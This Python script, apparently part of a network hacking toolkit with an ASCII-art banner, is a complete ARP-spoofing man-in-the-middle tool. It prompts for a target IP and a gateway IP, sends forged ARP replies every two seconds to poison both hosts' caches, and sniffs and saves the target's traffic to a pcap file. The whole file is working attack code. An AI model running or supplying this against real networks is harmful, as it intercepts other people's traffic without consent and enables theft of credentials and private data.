import sys
import time
import threading
from scapy.all import ARP, Ether, srp, sendp, sniff # type: ignore
from util import question, out, lbl, shader, output_dir

from pathlib import Path
from scapy.all import wrpcap, Packet

logo = """                                                                                     
         .=#############=.                       .#+.%-.                     -*##%%%@@@@@:          
         @              .#                      .@@@@@@@                     +@@@@@@@@@%@:          
         @              .#                    .%@@@@@@@@@@@-                 +@@@@@@@@@#@:          
         @              .#                      .:.:::::.                    .===========.          
         @              .# ================ @@@@@@@@@@@@@@@@% ============== +@+*@@@@@@.@:          
        .@@@...........@@@                  @@@@@@@@@@@@@@@@%                =@@@@@@@@@@@:          
       .@@@@@@@*:::@@@@@@@=.                @@@@@@.@@@+@@@@@%                +@@@@#.@@@@@:          
       .@@@@@@@@@@@@@@@@@@@.                @@@@@@.@@@.@@@@@%                +@@@@@@@@@@@:          
                                                ..#@@@:.                                                                     
"""


lbl(shader(logo), 0.0625)
print("\n")
target_ip = question("Enter the target IP address", "x.x.x.x")
gateway_ip = question("Enter the gateway IP address", "Router IP")


output = Path(output_dir) / "interceptor_results.pcap"

if output.exists():
    choice = question(f"output file {output.name} already exists. Overwrite?", "y/n")
    if choice.strip().lower() != 'y':
        out("warning", "Not writing packets to file. Proceeding without saving.")
        output = None
    else:
        out("warning", f"clearing {output.name}")
        with open(output, "r+") as f:
            f.truncate(0) 

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
    for _, rcv in ans:
        return rcv[Ether].src
    return None

target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)

if not target_mac or not gateway_mac:
    out("error", "Could not find MAC addresses. Exiting.")
    sys.exit(1)

def spoof(target_ip, target_mac, spoof_ip):
    packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, verbose=False)

def restore(dest_ip, dest_mac, src_ip, src_mac):
    packet = Ether(dst=dest_mac)/ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    sendp(packet, count=4, verbose=False)

stop_sniffing = threading.Event()
sniffed_packets = []
def packet_callback(packet):
    out("info", packet.summary())
    if output:
        sniffed_packets.append(packet)

def sniff_packets():
    sniff(filter=f"host {target_ip}", prn=packet_callback, store=0, stop_filter=lambda x: stop_sniffing.is_set())


sniffer_thread = threading.Thread(target=sniff_packets, daemon=True)
sniffer_thread.start()

try:
    out("info", "Starting ARP spoofing")
    while True:
        spoof(target_ip, target_mac, gateway_ip)
        spoof(gateway_ip, gateway_mac, target_ip)
        time.sleep(2)
except KeyboardInterrupt:
    out("warning", "Restoring ARP tables...")
    stop_sniffing.set()
    restore(target_ip, target_mac, gateway_ip, gateway_mac)
    restore(gateway_ip, gateway_mac, target_ip, target_mac)
    if output and sniffed_packets:
        wrpcap(str(output), sniffed_packets)
        out("success", f"Saved {len(sniffed_packets)} packets to {output.name}")
    out("success", "ARP tables restored. Exiting...")
